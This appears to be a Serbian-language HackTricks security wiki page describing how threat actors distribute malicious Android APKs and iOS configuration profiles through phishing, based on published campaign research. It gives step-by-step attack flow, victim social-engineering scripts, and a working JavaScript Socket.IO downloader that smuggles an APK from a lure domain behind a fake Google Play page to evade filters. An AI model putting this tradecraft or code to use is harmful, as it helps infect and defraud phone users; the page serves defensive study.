# Mobilni phishing i distribucija zlonamernih aplikacija (Android i iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ova stranica obuhvata tehnike koje akteri pretnji koriste za distribuciju **zlonamernih Android APK-ova** i **iOS profila za mobilnu konfiguraciju** putem phishinga (SEO, socijalni inženjering, lažne prodavnice, aplikacije za upoznavanje itd.).
> Materijal je prilagođen kampanji SarangTrap koju je razotkrio Zimperium zLabs (2025) i drugim javnim istraživanjima.<sup>[[1]](#references)</sup>

## Tok napada

1. **SEO/phishing infrastruktura**
   * Registrujte desetine domena koji liče na legitimne (upoznavanje, deljenje sadržaja u cloud-u, auto-servis…).
     – Koristite ključne reči na lokalnom jeziku i emoji-je u elementu `<title>` da biste se bolje rangirali na Google-u.
     – Na istoj landing stranici navedite uputstva za instalaciju i za Android (`.apk`) i za iOS.
2. **Preuzimanje prve faze**
   * Android: direktna veza do nepotpisanog APK-a ili APK-a iz „third-party store“ prodavnice.
   * iOS: `itms-services://` ili obična HTTPS veza do zlonamernog profila **mobileconfig** (pogledajte ispod).
3. **Ponašanje Android malware-a nakon instalacije**
   * Izvršavanje kontrolisano preko C2, zloupotreba dozvola, zaobilaženje dropper-a, prikupljanje podataka u pozadini i druga post-install ponašanja malware-a obrađena su na posebnoj stranici Android Malware Post-Exploitation ispod.
4. **Tehnika isporuke za iOS**
   * Jedan **profil za mobilnu konfiguraciju** može da zahteva `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. kako bi uređaj bio upisan u nadzor nalik na „MDM“.
   * Uputstva zasnovana na socijalnom inženjeringu:
     1. Otvorite Settings ➜ *Profile downloaded*.
     2. Dodirnite *Install* tri puta (snimci ekrana na phishing stranici).
     3. Verujte nepotpisanom profilu ➜ napadač dobija ovlašćenja za *Contacts* i *Photo* bez App Store provere.
5. **iOS Web Clip payload (ikona phishing aplikacije)**
   * `com.apple.webClip.managed` payload-i mogu da **zakače phishing URL na Home Screen** uz brendiranu ikonu/oznaku.
   * Web Clips mogu da rade **preko celog ekrana** (sakrivajući interfejs pregledača) i mogu biti označeni kao **neuklonjivi**, zbog čega žrtva mora da obriše profil da bi uklonila ikonu.<sup>[[3]](#references)</sup>
6. **Mrežni sloj**
   * Običan HTTP, često na portu 80, sa HOST zaglavljem poput `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (bez TLS-a → lako se uočava).

## Android Malware Post-Exploitation

Za post-install Android malware tradecraft kao što su C2, zloupotreba Accessibility-ja, overlays, ATS automatizacija, staged DEX učitavanje, premium SMS i persistence, pogledajte:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK krijumčarenje zasnovano na Socket.IO/WebSocket-u + lažne Google Play stranice

Napadači sve češće zamenjuju statične APK linkove Socket.IO/WebSocket kanalom ugrađenim u mamce koji izgledaju kao Google Play. Time se prikriva URL payloada, zaobilaze filteri za URL-ove/ekstenzije i zadržava uverljiv UX instalacije.<sup>[[2]](#references)[[4]](#references)</sup>

Tipičan tok klijenta zabeležen u stvarnim napadima:

<details>
<summary>Socket.IO lažni Play downloader (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Zašto zaobilazi jednostavne kontrole:
- Ne otkriva se statički APK URL; payload se rekonstruiše u memoriji iz WebSocket frame-ova.
- URL/MIME/ekstenzijski filteri koji blokiraju direktne .apk odgovore mogu da previde binarne podatke koji se prenose preko WebSockets/Socket.IO.
- Crawler-i i URL sandbox-i koji ne izvršavaju WebSockets neće preuzeti payload.

Pogledajte i WebSocket tradecraft i alate:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Mračna strana romantike: kampanja iznude SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Podešavanja Web Clips payloada za Apple uređaje](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Bankarski trojanac cilja korisnike Androida u Indoneziji i Vijetnamu](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
